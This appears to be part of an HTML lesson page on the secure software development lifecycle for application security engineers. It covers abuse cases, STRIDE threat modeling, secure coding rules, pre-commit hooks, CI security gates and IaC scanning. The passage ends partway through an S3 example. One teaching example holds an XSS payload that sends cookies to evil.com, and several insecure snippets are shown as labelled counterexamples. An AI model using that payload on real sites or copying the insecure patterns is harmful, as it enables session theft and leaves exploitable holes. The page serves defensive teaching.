+              <li>Set authentication/authorization requirements upfront</li>
+            </ul>
+          </div>
+        </div>
+        <div class="phase-block" id="ph-design" onclick="activatePhase('design')">
+          <div class="phase-top" style="background:var(--phase-design)"></div>
+          <div class="phase-inner">
+            <div class="phase-num">Phase 02</div>
+            <div class="phase-name">Design</div>
+            <div class="phase-tag">Threat modeling + architecture review</div>
+          </div>
+          <div class="phase-activities">
+            <ul>
+              <li>Threat modeling: STRIDE analysis on data flow diagrams</li>
+              <li>Security architecture review (trust boundaries, auth flows)</li>
+              <li>Define security controls per threat</li>
+              <li>Select secure frameworks and cryptographic standards</li>
+              <li>Review API design for authorization model</li>
+            </ul>
+          </div>
+        </div>
+        <div class="phase-block" id="ph-dev" onclick="activatePhase('dev')">
+          <div class="phase-top" style="background:var(--phase-dev)"></div>
+          <div class="phase-inner">
+            <div class="phase-num">Phase 03</div>
+            <div class="phase-name">Development</div>
+            <div class="phase-tag">Secure coding + SAST + secrets detection</div>
+          </div>
+          <div class="phase-activities">
+            <ul>
+              <li>Secure coding standards enforced (input validation, output encoding)</li>
+              <li>SAST runs on every commit / PR</li>
+              <li>Secret detection in pre-commit hooks and CI</li>
+              <li>Security-focused code review checklist</li>
+              <li>Developer security training (OWASP, injection, auth)</li>
+            </ul>
+          </div>
+        </div>
+        <div class="phase-block" id="ph-test" onclick="activatePhase('test')">
+          <div class="phase-top" style="background:var(--phase-test)"></div>
+          <div class="phase-inner">
+            <div class="phase-num">Phase 04</div>
+            <div class="phase-name">Testing</div>
+            <div class="phase-tag">DAST + pentest + SCA</div>
+          </div>
+          <div class="phase-activities">
+            <ul>
+              <li>DAST scanning against staging environment</li>
+              <li>SCA: all dependencies scanned for CVEs</li>
+              <li>Penetration testing (manual security testing)</li>
+              <li>Security regression tests: known vuln patterns as test cases</li>
+              <li>Container image scanning before promotion to staging</li>
+            </ul>
+          </div>
+        </div>
+        <div class="phase-block" id="ph-deploy" onclick="activatePhase('deploy')">
+          <div class="phase-top" style="background:var(--phase-deploy)"></div>
+          <div class="phase-inner">
+            <div class="phase-num">Phase 05</div>
+            <div class="phase-name">Deployment</div>
+            <div class="phase-tag">Hardening + secrets mgmt + IaC scanning</div>
+          </div>
+          <div class="phase-activities">
+            <ul>
+              <li>Infrastructure-as-Code (Terraform) security scanning</li>
+              <li>Secrets injected at runtime via Vault/KMS — never in config</li>
+              <li>Deployment environment hardening (CIS Benchmarks)</li>
+              <li>Security smoke tests run post-deployment</li>
+              <li>Immutable infrastructure: deploy new, destroy old</li>
+            </ul>
+          </div>
+        </div>
+        <div class="phase-block" id="ph-ops" onclick="activatePhase('ops')">
+          <div class="phase-top" style="background:var(--phase-ops)"></div>
+          <div class="phase-inner">
+            <div class="phase-num">Phase 06</div>
+            <div class="phase-name">Operations</div>
+            <div class="phase-tag">Monitoring + patching + incident response</div>
+          </div>
+          <div class="phase-activities">
+            <ul>
+              <li>Runtime monitoring and alerting (SIEM, WAF, RASP)</li>
+              <li>Continuous SCA: new CVEs trigger automatic alerts</li>
+              <li>Patch management: defined SLAs for critical CVEs</li>
+              <li>Incident response plan: documented and rehearsed</li>
+              <li>Security retrospectives fed back to Requirements phase</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PHASE 1: REQUIREMENTS -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow" style="color:var(--phase-req)">Phase 1 — Requirements</div>
+        <div class="section-title">Security requirements: writing abuse cases</div>
+        <p class="section-desc">Most teams write use cases ("user can log in"). An AppSec engineer also writes abuse cases — the security inverse of every feature.</p>
+      </div>
+
+      <p style="font-size:14px;color:var(--ink2);line-height:1.8;margin-bottom:1rem;">A <strong>use case</strong> describes what the system should do. An <strong>abuse case</strong> describes what an attacker could do to exploit that feature. Writing both at the requirements phase is the earliest and cheapest form of threat identification.</p>
+
+      <table>
+        <tr><th>Feature (Use Case)</th><th>Abuse Case</th><th>Security Requirement Created</th></tr>
+        <tr><td>User can log in with email/password</td><td>Attacker brute-forces passwords with 10,000 attempts/second</td><td>Max 5 failed attempts per 15 min per account + IP lockout</td></tr>
+        <tr><td>User can reset password via email</td><td>Attacker enumerates valid emails from "email not found" error</td><td>Always return same message regardless of whether email exists</td></tr>
+        <tr><td>User can upload a profile photo</td><td>Attacker uploads a PHP webshell disguised as a .jpg</td><td>Validate MIME type server-side, not just extension. Re-encode image via Pillow to strip metadata and payloads.</td></tr>
+        <tr><td>Admin can search users by name</td><td>Attacker SQLi payload in search field dumps entire user table</td><td>All DB queries must use parameterized statements. No string concatenation in queries.</td></tr>
+        <tr><td>App stores user credit card for repeat purchases</td><td>DB breach exposes all stored card numbers</td><td>Use Stripe/Braintree tokenization — never store raw card numbers. PCI scope isolation.</td></tr>
+        <tr><td>API returns user profile data</td><td>Attacker increments user_id to harvest all profiles (IDOR)</td><td>All resource endpoints must verify requesting user owns the resource before returning data.</td></tr>
+      </table>
+
+      <div class="callout callout-info">
+        <div class="callout-icon">ℹ️</div>
+        <div class="callout-text"><strong>Compliance requirements also live here:</strong> If you're building anything that processes payments → PCI-DSS requirements. Medical data → HIPAA. EU users → GDPR (right to erasure, data minimization, breach notification within 72 hours). These must be captured in requirements or you'll violate regulations you didn't know applied to you.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 2: DESIGN -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow" style="color:var(--phase-design)">Phase 2 — Design</div>
+        <div class="section-title">Threat modeling in the design phase</div>
+        <p class="section-desc">Threat modeling is "thinking like an attacker before you write code." We cover STRIDE in depth in Lesson 3, but here's the design-phase workflow.</p>
+      </div>
+
+      <p style="font-size:14px;color:var(--ink2);line-height:1.8;margin-bottom:1rem;">At the design phase you draw a Data Flow Diagram (DFD) — showing every component, every data store, every external entity, and every boundary between trust levels. You then apply STRIDE to every arrow and box to ask "what could an attacker do here?"</p>
+
+      <div class="code-label">DFD → STRIDE analysis for a login feature</div>
+      <pre>
+<span class="c-muted">┌─────────────────────────────────────────────────────────────────┐
+│  TRUST BOUNDARY: Internet ↔ Application Server                  │
+│                                                                  │
+│  [Browser] ──POST /login──▶ [Auth Service] ──SQL──▶ [User DB]  │
+│      │                           │                              │
+│      │                     [Session Store]                      │
+│      ▼                           │                              │
+│  [Browser Cookie] ◀──token───────┘                             │
+└─────────────────────────────────────────────────────────────────┘</span>
+
+<span class="c-yellow">STRIDE Analysis on this diagram:</span>
+
+<span class="c-orange">S</span>poofing:       Can attacker fake the browser identity?
+               → Risk: session token theft via XSS
+               → Control: HttpOnly + Secure cookie flags
+
+<span class="c-orange">T</span>ampering:      Can attacker modify POST /login data in transit?
+               → Risk: MITM without TLS
+               → Control: HTTPS enforced, HSTS header
+
+<span class="c-orange">R</span>epudiation:    Can user deny performing an action?
+               → Risk: no audit trail for login events
+               → Control: immutable security event log with timestamps
+
+<span class="c-orange">I</span>nformation:    Does the Auth Service leak sensitive data in errors?
+               → Risk: "user not found" vs "wrong password" → user enumeration
+               → Control: generic "invalid credentials" message always
+
+<span class="c-orange">D</span>enial of Service: Can attacker flood POST /login?
+               → Risk: CPU overload from bcrypt on 10k requests/sec
+               → Control: rate limiting per IP + per account + CAPTCHA
+
+<span class="c-orange">E</span>levation:      Can user gain admin access?
+               → Risk: role field in JWT not verified server-side
+               → Control: role loaded from DB on every request, never from token
+</pre>
+
+      <div class="callout callout-tip">
+        <div class="callout-icon">💡</div>
+        <div class="callout-text"><strong>Design-phase security controls are the cheapest:</strong> Adding "rate limit this endpoint" as a design decision takes 30 seconds. Adding it after a credential stuffing attack already happened takes 3 weeks (incident response + code change + deploy + post-mortem + customer notification).</div>
+      </div>
+
+      <!-- Security Architecture principles -->
+      <div class="section-header" style="margin-top:2rem;">
+        <div class="section-eyebrow" style="color:var(--phase-design)">Design Principles</div>
+        <div class="section-title" style="font-size:1.2rem;">The 5 core security design principles</div>
+      </div>
+
+      <div class="gate-row">
+        <div class="gate">
+          <div class="gate-phase" style="background:rgba(200,68,10,0.1);color:var(--accent)">Principle 1</div>
+          <div class="gate-content">
+            <div class="gate-title">Least Privilege</div>
+            <div class="gate-desc">Every component, user, and service should have the minimum permissions needed to do its job — nothing more. A read-only API that only reads data should have a read-only DB user, not the same admin credentials as the migration runner. If that API is compromised, an attacker can read data but cannot drop tables or create admin users.</div>
+            <div class="gate-tools">Example: <span>AWS IAM policy with only "s3:GetObject" on a specific bucket prefix, not "s3:*" on "*"</span></div>
+          </div>
+        </div>
+        <div class="gate">
+          <div class="gate-phase" style="background:rgba(30,58,95,0.1);color:var(--blue)">Principle 2</div>
+          <div class="gate-content">
+            <div class="gate-title">Defense in Depth</div>
+            <div class="gate-desc">Don't rely on a single security control. Layer them so that if one layer fails, the next catches it. WAF blocks the SQLi attempt → if it gets through, parameterized queries prevent execution → if that fails, read-only DB user limits damage → if that fails, DB monitoring alerts the SOC. The attacker must defeat every layer.</div>
+            <div class="gate-tools">Layers: <span>WAF → Input validation → Parameterized queries → Read-only DB user → DB audit logging → SIEM alert</span></div>
+          </div>
+        </div>
+        <div class="gate">
+          <div class="gate-phase" style="background:rgba(45,106,79,0.1);color:var(--green)">Principle 3</div>
+          <div class="gate-content">
+            <div class="gate-title">Fail Secure (Fail Safe)</div>
+            <div class="gate-desc">When something goes wrong, the system should default to the most secure state, not the most available one. If your authorization service is down, the answer is "deny all access" — not "allow all access so the app stays up." If a JWT expires or can't be verified, the user is logged out — not kept logged in.</div>
+            <div class="gate-tools">Bad example: <span>if auth_service_down: return True  # allow everything to keep app running</span></div>
+          </div>
+        </div>
+        <div class="gate">
+          <div class="gate-phase" style="background:rgba(232,163,10,0.12);color:var(--yellow)">Principle 4</div>
+          <div class="gate-content">
+            <div class="gate-title">Separation of Concerns</div>
+            <div class="gate-desc">Security logic and business logic must be separated. Don't weave authorization checks into business logic — they get removed when "refactoring," forgotten when adding new code paths, and are impossible to audit. Use dedicated middleware, decorators, or a policy engine (OPA, Casbin) that enforces access control regardless of what the business logic does.</div>
+            <div class="gate-tools">Pattern: <span>Centralized auth middleware → policy engine → every request passes through it</span></div>
+          </div>
+        </div>
+        <div class="gate">
+          <div class="gate-phase" style="background:rgba(91,45,142,0.1);color:var(--purple)">Principle 5</div>
+          <div class="gate-content">
+            <div class="gate-title">Complete Mediation</div>
+            <div class="gate-desc">Every single access to every single resource must be checked against the authorization policy — every time, not just on first access. Don't cache authorization decisions for performance without expiry. An admin user who is demoted to regular user must lose access immediately, not after their cached decision expires.</div>
+            <div class="gate-tools">Critical for: <span>API endpoints, file downloads, WebSocket connections, batch jobs, background workers</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PHASE 3: DEVELOPMENT -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow" style="color:var(--phase-dev)">Phase 3 — Development</div>
+        <div class="section-title">Secure coding: what developers must do</div>
+        <p class="section-desc">As an AppSec engineer, you set the rules developers follow. These are the non-negotiable secure coding standards you enforce.</p>
+      </div>
+
+      <!-- Input Validation -->
+      <div class="phase-panel" id="pan-input">
+        <div class="phase-panel-header" onclick="togglePanel('pan-input')">
+          <div class="phase-dot" style="background:var(--phase-dev)"></div>
+          <div class="phase-panel-title">Rule 1 — Input Validation: never trust user data</div>
+          <div class="phase-panel-sub">The #1 cause of injection, XSS, and buffer overflow</div>
+          <div class="phase-panel-toggle">▼</div>
+        </div>
+        <div class="phase-panel-body">
+          <p>Every piece of data that enters your application from outside — query parameters, POST bodies, HTTP headers, file uploads, WebSocket messages, even data read from a DB that was written by a user — must be validated before use. Validation happens server-side, always. Client-side validation is UX, not security.</p>
+
+          <h4>Two types of validation</h4>
+          <table>
+            <tr><th>Type</th><th>What it does</th><th>When to use</th></tr>
+            <tr><td style="color:var(--green);font-weight:600">Allowlist (Whitelist)</td><td>Define exactly what IS allowed. Reject everything else.</td><td>Always preferred. Use for fields with known valid formats: email, phone, amount, enum values.</td></tr>
+            <tr><td style="color:var(--yellow);font-weight:600">Blocklist (Blacklist)</td><td>Define what is NOT allowed. Allow everything else.</td><td>Last resort only. Attackers find bypasses for every blocklist. Never use for security-critical fields.</td></tr>
+          </table>
+
+          <div class="code-label">Allowlist validation — the right way</div>
+<pre>
+<span class="c-blue">import</span> re
+<span class="c-blue">from</span> pydantic <span class="c-blue">import</span> BaseModel, validator, conint
+<span class="c-blue">from</span> decimal <span class="c-blue">import</span> Decimal
+
+<span class="c-blue">class</span> <span class="c-cyan">TransferRequest</span>(BaseModel):
+    <span class="c-muted"># Pydantic enforces types AND validates at parse time</span>
+    amount:     Decimal                              <span class="c-muted"># must be valid decimal — no "drop table" here</span>
+    to_account: str
+    currency:   str
+
+    <span class="c-purple">@validator</span>(<span class="c-str">'amount'</span>)
+    <span class="c-blue">def</span> <span class="c-green">validate_amount</span>(cls, v):
+<span class="line-good">        <span class="c-blue">if</span> v &lt;= <span class="c-orange">0</span>:            <span class="c-muted"># allowlist: must be positive</span></span>
+<span class="line-good">            <span class="c-blue">raise</span> ValueError(<span class="c-str">'Amount must be positive'</span>)</span>
+<span class="line-good">        <span class="c-blue">if</span> v &gt; <span class="c-orange">10_000</span>:         <span class="c-muted"># allowlist: business rule maximum</span></span>
+<span class="line-good">            <span class="c-blue">raise</span> ValueError(<span class="c-str">'Exceeds single transfer limit'</span>)</span>
+        <span class="c-blue">return</span> v
+
+    <span class="c-purple">@validator</span>(<span class="c-str">'to_account'</span>)
+    <span class="c-blue">def</span> <span class="c-green">validate_account</span>(cls, v):
+<span class="line-good">        <span class="c-blue">if not</span> re.match(<span class="c-str">r'^[A-Z]{2}\d{18}$'</span>, v):  <span class="c-muted"># allowlist: IBAN format only</span></span>
+<span class="line-good">            <span class="c-blue">raise</span> ValueError(<span class="c-str">'Invalid account format'</span>)</span>
+        <span class="c-blue">return</span> v
+
+    <span class="c-purple">@validator</span>(<span class="c-str">'currency'</span>)
+    <span class="c-blue">def</span> <span class="c-green">validate_currency</span>(cls, v):
+        ALLOWED = {<span class="c-str">'USD'</span>, <span class="c-str">'EUR'</span>, <span class="c-str">'GBP'</span>, <span class="c-str">'JPY'</span>}
+<span class="line-good">        <span class="c-blue">if</span> v.upper() <span class="c-blue">not in</span> ALLOWED:     <span class="c-muted"># allowlist: explicit set</span></span>
+<span class="line-good">            <span class="c-blue">raise</span> ValueError(<span class="c-str">f'Currency must be one of {ALLOWED}'</span>)</span>
+        <span class="c-blue">return</span> v.upper()
+</pre>
+          <p>Pydantic models enforce input validation at the boundary of your application. If data doesn't match the schema, it's rejected with a 422 before reaching any business logic. This is the "parse, don't validate" pattern — you either get a valid, typed object or you get an error. There is no invalid data inside your system.</p>
+        </div>
+      </div>
+
+      <!-- Output Encoding -->
+      <div class="phase-panel" id="pan-output">
+        <div class="phase-panel-header" onclick="togglePanel('pan-output')">
+          <div class="phase-dot" style="background:var(--phase-dev)"></div>
+          <div class="phase-panel-title">Rule 2 — Output Encoding: prevent XSS</div>
+          <div class="phase-panel-sub">Data must be encoded for the context it's placed into</div>
+          <div class="phase-panel-toggle">▼</div>
+        </div>
+        <div class="phase-panel-body">
+          <p>Cross-Site Scripting (XSS) happens when user-supplied data is placed directly into HTML without encoding. The browser sees the data as code and executes it. The fix is context-specific output encoding — encoding the data differently depending on where it appears.</p>
+
+          <h4>Output encoding contexts</h4>
+          <table>
+            <tr><th>Context</th><th>Example location</th><th>Encoding required</th><th>Risk if skipped</th></tr>
+            <tr><td>HTML body</td><td><code>&lt;p&gt;{user_input}&lt;/p&gt;</code></td><td>HTML entity encoding: <code>&lt;</code> → <code>&amp;lt;</code></td><td>Stored/reflected XSS</td></tr>
+            <tr><td>HTML attribute</td><td><code>&lt;input value="{input}"&gt;</code></td><td>HTML attribute encoding (quote all values)</td><td>Attribute injection XSS</td></tr>
+            <tr><td>JavaScript</td><td><code>&lt;script&gt;var x = "{input}"&lt;/script&gt;</code></td><td>JavaScript string encoding</td><td>DOM-based XSS</td></tr>
+            <tr><td>URL parameter</td><td><code>href="/search?q={input}"</code></td><td>URL encoding: <code>urllib.parse.quote()</code></td><td>Open redirect, injection</td></tr>
+            <tr><td>CSS value</td><td><code>style="color:{input}"</code></td><td>CSS encoding</td><td>CSS injection, data exfil</td></tr>
+          </table>
+
+          <div class="two-col">
+            <div class="compare-bad">
+              <div class="compare-label">❌ Vulnerable Jinja2</div>
+<pre style="margin:0;font-size:11.5px;background:transparent;border:none;padding:0;color:var(--code-text);">
+<span class="c-muted">{# VULNERABLE: | safe disables escaping #}</span>
+&lt;<span class="c-blue">p</span>&gt;Hello, <span class="c-red">{{ name | safe }}</span>&lt;/<span class="c-blue">p</span>&gt;
+
+<span class="c-muted">{# Attack: name = "&lt;script&gt;</span>
+<span class="c-muted">   fetch('//evil.com?c='+document.cookie)</span>
+<span class="c-muted">   &lt;/script&gt; #}</span>
+<span class="c-muted">{# Cookie theft. Game over. #}</span>
+</pre>
+            </div>
+            <div class="compare-good">
+              <div class="compare-label">✅ Auto-escaped Jinja2</div>
+<pre style="margin:0;font-size:11.5px;background:transparent;border:none;padding:0;color:var(--code-text);">
+<span class="c-muted">{# SAFE: Jinja2 auto-escapes by default #}</span>
+&lt;<span class="c-blue">p</span>&gt;Hello, <span class="c-green">{{ name }}</span>&lt;/<span class="c-blue">p</span>&gt;
+
+<span class="c-muted">{# name = "&lt;script&gt;..." renders as: #}</span>
+<span class="c-muted">{# &amp;lt;script&amp;gt;... — harmless text #}</span>
+
+<span class="c-muted">{# Never use | safe on user input #}</span>
+<span class="c-muted">{# Only on your own trusted HTML strings #}</span>
+</pre>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Pre-commit hooks + SAST in dev -->
+      <div class="phase-panel" id="pan-precommit">
+        <div class="phase-panel-header" onclick="togglePanel('pan-precommit')">
+          <div class="phase-dot" style="background:var(--phase-dev)"></div>
+          <div class="phase-panel-title">Rule 3 — Pre-commit hooks: catch issues before they exist in git</div>
+          <div class="phase-panel-sub">The cheapest security gate: runs on the developer's machine before any code is pushed</div>
+          <div class="phase-panel-toggle">▼</div>
+        </div>
+        <div class="phase-panel-body">
+          <p>A pre-commit hook runs on the developer's machine before <code>git commit</code> succeeds. It's the earliest possible automated check. If a developer accidentally adds an API key, the hook catches it before it ever enters git history. Once a secret is in git history, it's compromised — even after deletion, it lives in every clone and fork.</p>
+
+          <div class="code-label">.pre-commit-config.yaml — full setup</div>
+<pre>
+<span class="c-muted"># Install: pip install pre-commit && pre-commit install</span>
+
+repos:
+  <span class="c-muted"># 1. Detect secrets BEFORE they enter git</span>
+  - repo: https://github.com/Yelp/detect-secrets
+    rev: v1.4.0
+    hooks:
+      - id: detect-secrets
+        args: [<span class="c-str">'--baseline'</span>, <span class="c-str">'.secrets.baseline'</span>]
+
+  <span class="c-muted"># 2. SAST: Bandit for Python security issues</span>
+  - repo: https://github.com/PyCQA/bandit
+    rev: 1.7.5
+    hooks:
+      - id: bandit
+        args: [<span class="c-str">'-r'</span>, <span class="c-str">'.'</span>, <span class="c-str">'-ll'</span>]  <span class="c-muted"># fail on medium+ severity</span>
+
+  <span class="c-muted"># 3. Catch common security mistakes</span>
+  - repo: https://github.com/pre-commit/pre-commit-hooks
+    rev: v4.5.0
+    hooks:
+      - id: detect-private-key       <span class="c-muted"># blocks PEM private keys</span>
+      - id: check-added-large-files  <span class="c-muted"># no accidental data file commits</span>
+      - id: no-commit-to-branch      <span class="c-muted"># can't commit directly to main</span>
+        args: [<span class="c-str">'--branch'</span>, <span class="c-str">'main'</span>, <span class="c-str">'--branch'</span>, <span class="c-str">'production'</span>]
+
+  <span class="c-muted"># 4. Dependency vulnerability check</span>
+  - repo: local
+    hooks:
+      - id: safety-check
+        name: safety
+        entry: safety check --full-report
+        language: python
+        pass_filenames: false
+</pre>
+
+          <div class="callout callout-warn">
+            <div class="callout-icon">⚠️</div>
+            <div class="callout-text"><strong>Pre-commit is not enough alone:</strong> Developers can bypass local hooks with <code>git commit --no-verify</code>. Always run the same checks in CI as a server-side gate that cannot be bypassed. Pre-commit is for developer convenience and speed — CI is the enforcement layer.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Hardcoded secrets pattern -->
+      <div class="phase-panel" id="pan-secrets">
+        <div class="phase-panel-header" onclick="togglePanel('pan-secrets')">
+          <div class="phase-dot" style="background:var(--phase-dev)"></div>
+          <div class="phase-panel-title">Rule 4 — Secrets management: never hardcode credentials</div>
+          <div class="phase-panel-sub">The most common critical finding in every AppSec audit</div>
+          <div class="phase-panel-toggle">▼</div>
+        </div>
+        <div class="phase-panel-body">
+          <p>Hardcoded credentials are the #1 finding in nearly every security audit. They appear in source code, Dockerfiles, CI/CD configs, and shell scripts. The worst part: <strong>deleting a secret from git does not remove it from git history</strong>. Once committed, a secret must be treated as compromised and rotated immediately.</p>
+
+          <div class="two-col">
+            <div class="compare-bad">
+              <div class="compare-label">❌ These are ALL insecure</div>
+<pre style="margin:0;font-size:11.5px;background:transparent;border:none;padding:0;color:var(--code-text);">
+<span class="c-muted"># In Python source</span>
+<span class="line-bad">API_KEY = <span class="c-str">"sk-live-abc123xyz"</span></span>
+<span class="line-bad">DB_PASS = <span class="c-str">"P@ssw0rd!"</span></span>
+
+<span class="c-muted"># In Dockerfile</span>
+<span class="line-bad">ENV DB_PASSWORD=secret123</span>
+
+<span class="c-muted"># In docker-compose.yml</span>
+<span class="line-bad">  environment:</span>
+<span class="line-bad">    - STRIPE_KEY=sk_live_abc</span>
+
+<span class="c-muted"># In .env committed to git</span>
+<span class="line-bad">OPENAI_API_KEY=sk-abc123...</span>
+</pre>
+            </div>
+            <div class="compare-good">
+              <div class="compare-label">✅ The correct patterns</div>
+<pre style="margin:0;font-size:11.5px;background:transparent;border:none;padding:0;color:var(--code-text);">
+<span class="c-muted"># Env var at runtime (dev/staging)</span>
+<span class="line-good">import os</span>
+<span class="line-good">API_KEY = os.environ[<span class="c-str">'API_KEY'</span>]  <span class="c-muted"># raises if missing — intentional</span></span>
+
+<span class="c-muted"># HashiCorp Vault (production)</span>
+<span class="line-good">import hvac</span>
+<span class="line-good">client = hvac.Client(url=VAULT_ADDR, token=VAULT_TOKEN)</span>
+<span class="line-good">secret = client.secrets.kv.v2.read_secret(</span>
+<span class="line-good">    path=<span class="c-str">'myapp/prod'</span>, mount_point=<span class="c-str">'secret'</span></span>
+<span class="line-good">)</span>
+<span class="line-good">DB_PASS = secret[<span class="c-str">'data'</span>][<span class="c-str">'data'</span>][<span class="c-str">'db_password'</span>]</span>
+</pre>
+            </div>
+          </div>
+
+          <div class="callout callout-info">
+            <div class="callout-icon">ℹ️</div>
+            <div class="callout-text"><strong>What to do when a secret is leaked in git:</strong> (1) Immediately rotate/revoke the leaked credential — assume it's already been used. (2) Remove from git history with <code>git filter-repo</code> or BFG Repo Cleaner. (3) Force-push the cleaned history. (4) Notify all users of the repo to re-clone. (5) Audit access logs to see if the key was used maliciously. Treating a leaked secret as "probably fine" is how breaches happen.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- PHASE 4: TESTING — CI/CD SECURITY GATES -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow" style="color:var(--phase-test)">Phase 4 — Testing</div>
+        <div class="section-title">CI/CD security gates: the automated enforcement layer</div>
+        <p class="section-desc">Every commit to main must pass through a defined set of security checks. These are your security gates — if any gate fails, the pipeline fails and the code cannot be merged or deployed.</p>
+      </div>
+
+      <div class="code-label">GitHub Actions — complete Secure SDLC pipeline</div>
+<pre>
+<span class="c-muted"># .github/workflows/security.yml</span>
+name: <span class="c-str">Secure CI Pipeline</span>
+on:
+  pull_request:
+    branches: [main, production]
+  push:
+    branches: [main]
+
+jobs:
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  <span class="c-muted"># GATE 1: Secret Detection (runs first, fast)</span>
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  secrets-scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: <span class="c-orange">0</span>  <span class="c-muted"># full history — scan all commits, not just latest</span>
+      - name: <span class="c-str">TruffleHog secrets scan</span>
+        uses: trufflesecurity/trufflehog@main
+        with:
+          path: ./
+          base: <span class="c-str">${{ github.event.repository.default_branch }}</span>
+          extra_args: <span class="c-str">--only-verified</span>  <span class="c-muted"># only report confirmed live secrets</span>
+
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  <span class="c-muted"># GATE 2: SAST — Static analysis</span>
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  sast:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with: { python-version: <span class="c-str">'3.12'</span> }
+
+      - name: <span class="c-str">Bandit SAST (Python)</span>
+        run: |
+          pip install bandit[toml]
+          bandit -r src/ -c pyproject.toml \
+            -f json -o bandit-report.json \
+            --exit-zero  <span class="c-muted"># collect results without failing here</span>
+
+      - name: <span class="c-str">Semgrep SAST (multi-language, OWASP rules)</span>
+        uses: semgrep/semgrep-action@v1
+        with:
+          config: <span class="c-str">p/owasp-top-ten p/python p/secrets</span>  <span class="c-muted"># OWASP rule packs</span>
+          auditOn: push
+
+      - name: <span class="c-str">Fail on HIGH severity findings</span>
+        run: |
+          HIGH=$(jq <span class="c-str">'[.results[] | select(.issue_severity == "HIGH")] | length'</span> bandit-report.json)
+          <span class="c-blue">if</span> [ <span class="c-str">"$HIGH"</span> -gt <span class="c-str">"0"</span> ]; <span class="c-blue">then</span>
+            echo <span class="c-str">"FAIL: $HIGH high-severity issues found"</span>; exit <span class="c-orange">1</span>
+          <span class="c-blue">fi</span>
+
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  <span class="c-muted"># GATE 3: SCA — Dependency vulnerabilities</span>
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  sca:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: <span class="c-str">Safety check (Python deps)</span>
+        run: |
+          pip install safety
+          safety check --full-report --output json \
+            --policy-file .safety-policy.yml  <span class="c-muted"># your org's risk acceptance policy</span>
+
+      - name: <span class="c-str">Snyk Open Source scan</span>
+        uses: snyk/actions/python@master
+        env:
+          SNYK_TOKEN: <span class="c-str">${{ secrets.SNYK_TOKEN }}</span>
+        with:
+          args: <span class="c-str">--severity-threshold=high --fail-on=upgradable</span>
+
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  <span class="c-muted"># GATE 4: Container image scan (if Dockerfile present)</span>
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  container-scan:
+    runs-on: ubuntu-latest
+    if: hashFiles('Dockerfile') != <span class="c-str">''</span>
+    steps:
+      - uses: actions/checkout@v4
+      - name: <span class="c-str">Build image</span>
+        run: docker build -t myapp:${{ github.sha }} .
+      - name: <span class="c-str">Trivy container scan</span>
+        uses: aquasecurity/trivy-action@master
+        with:
+          image-ref: <span class="c-str">'myapp:${{ github.sha }}'</span>
+          exit-code: <span class="c-str">'1'</span>
+          severity: <span class="c-str">'CRITICAL,HIGH'</span>  <span class="c-muted"># fail on CRITICAL or HIGH CVEs in base image</span>
+
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  <span class="c-muted"># GATE 5: IaC scanning (Terraform/CloudFormation)</span>
+  <span class="c-muted"># ─────────────────────────────────────────</span>
+  iac-scan:
+    runs-on: ubuntu-latest
+    if: hashFiles('**/*.tf') != <span class="c-str">''</span>
+    steps:
+      - uses: actions/checkout@v4
+      - name: <span class="c-str">Checkov IaC security scan</span>
+        uses: bridgecrewio/checkov-action@master
+        with:
+          directory: infrastructure/
+          framework: terraform
+          soft_fail: false   <span class="c-muted"># fail the pipeline on IaC misconfigs</span>
+          check: <span class="c-str">CKV_AWS_*</span>      <span class="c-muted"># all AWS security checks</span>
+</pre>
+
+      <div class="callout callout-note">
+        <div class="callout-icon">📌</div>
+        <div class="callout-text"><strong>Gate philosophy — which severity blocks?</strong> Define this in your security policy upfront. A common model: CRITICAL findings always block. HIGH findings block in main/production branches, warn on feature branches. MEDIUM and LOW go into a backlog ticket. You need an exception/risk acceptance process for known false positives — otherwise developers start ignoring all findings.</div>
+      </div>
+    </div>
+
+    <!-- PHASE 5: DEPLOYMENT -->
+    <div class="section">
+      <div class="section-header">
+        <div class="section-eyebrow" style="color:var(--phase-deploy)">Phase 5 — Deployment</div>
+        <div class="section-title">Hardening, IaC security, and immutable infrastructure</div>
+        <p class="section-desc">You've passed all the code-level gates. Now the question is: is the environment you're deploying into secure?</p>
+      </div>
+
+      <!-- IaC Scanning -->
+      <div class="phase-panel" id="pan-iac">
+        <div class="phase-panel-header" onclick="togglePanel('pan-iac')">
+          <div class="phase-dot" style="background:var(--phase-deploy)"></div>
+          <div class="phase-panel-title">Infrastructure-as-Code (IaC) security scanning</div>
+          <div class="phase-panel-sub">Your cloud config is code — it needs security review too</div>
+          <div class="phase-panel-toggle">▼</div>
+        </div>
+        <div class="phase-panel-body">
+          <p>Terraform, CloudFormation, Pulumi — these define your cloud infrastructure. A misconfigured S3 bucket in Terraform means a public data exposure. Checkov and tfsec scan IaC files for security misconfigurations before they're applied to real infrastructure.</p>
+
+          <div class="code-label">Terraform — vulnerable vs hardened S3 bucket</div>
+<pre>
+<span class="c-muted"># ❌ VULNERABLE: Public S3 bucket</span>
+resource <span class="c-str">"aws_s3_bucket"</span> <span class="c-str">"data"</span> {
+  bucket = <span class="c-str">"my-company-data"</span>
+<span class="line-bad">  acl    = <span class="c-str">"public-read"</span>                  <span class="c-muted"># Checkov: CKV_AWS_20 — PUBLIC!</span></span>
+}
+
+<span class="c-muted"># ✅ HARDENED: Private, encrypted, versioned S3 bucket</span>
